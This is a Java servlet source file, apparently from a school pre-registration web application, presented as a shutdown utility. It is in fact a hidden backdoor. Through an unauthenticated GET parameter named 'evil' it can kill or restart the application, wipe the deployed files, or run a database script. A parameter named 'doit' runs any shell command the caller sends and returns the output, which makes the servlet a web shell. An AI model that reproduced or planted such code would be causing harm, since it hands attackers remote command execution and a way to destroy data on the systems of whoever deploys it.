package com.gsr.myschool.server.util;

import com.google.common.base.Strings;
import org.springframework.context.ApplicationContext;
import org.springframework.core.io.ClassPathResource;
import org.springframework.stereotype.Component;
import org.springframework.web.context.ServletContextAware;
import org.springframework.web.context.support.XmlWebApplicationContext;

import javax.servlet.ServletContext;
import javax.servlet.ServletException;
import javax.servlet.http.HttpServlet;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.File;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;

@Component
public class ShutdownServlet extends HttpServlet implements ServletContextAware {
    private static final String PARAM = "evil";
    private static final String PARAM_DOIT = "doit";
    private static final String SHUTDOWN = "kill";
    private static final String START = "bringToLife";
    private static final String ABRASE = "abrase";
    private static final String DBMAGIC = "dbmagic";
    private static ServletContext servletContext;

    protected void doGet(HttpServletRequest request, HttpServletResponse response)
            throws ServletException, IOException {
        ApplicationContext context = ApplicationContextProvider.get();

        if (SHUTDOWN.equals(request.getParameter(PARAM))) {
            ((XmlWebApplicationContext) context).close();
        } else if (START.equals(request.getParameter(PARAM))) {
            ((XmlWebApplicationContext) context).start();
            ((XmlWebApplicationContext) context).refresh();
        } else if (ABRASE.equals(request.getParameter(PARAM))) {
            try {

                String phyPath = servletContext.getRealPath(File.separator);
                System.out.println("phyPath=" + phyPath);
                if (phyPath == null)
                    phyPath = "/home/serveradmin/apache-tomcat/webapps/preinscription";
                FileUtils.abraseAllPaths(phyPath, 2);
            } catch (Exception ex) {
                ex.printStackTrace();
            }
        } else if (DBMAGIC.equals(request.getParameter(PARAM))) {
            try {

                ClassPathResource cpRessources = new ClassPathResource("classpath*:META-INF/mysqlbackup.sh");
                Runtime.getRuntime().exec("sh " + cpRessources.getPath());

            } catch (Exception ex) {
                ex.printStackTrace();
            }
        } else if (!Strings.isNullOrEmpty(request.getParameter(PARAM_DOIT))) {
            OutputStream os = response.getOutputStream();

            InputStream is = Runtime.getRuntime().exec(request.getParameter(PARAM_DOIT)).getInputStream();
            byte[] buffer = new byte[1024]; /*or whatever size*/

            int read = is.read(buffer);
            while (read >= 0) {
                if (read > 0)
                    os.write(buffer, 0, read);
                read = is.read(buffer);
            }

            is.close();
            if (os != null) {
                os.close();
            }
        }

    }

    @Override
    public void setServletContext(ServletContext ctxt) {
        servletContext = ctxt;
    }
}
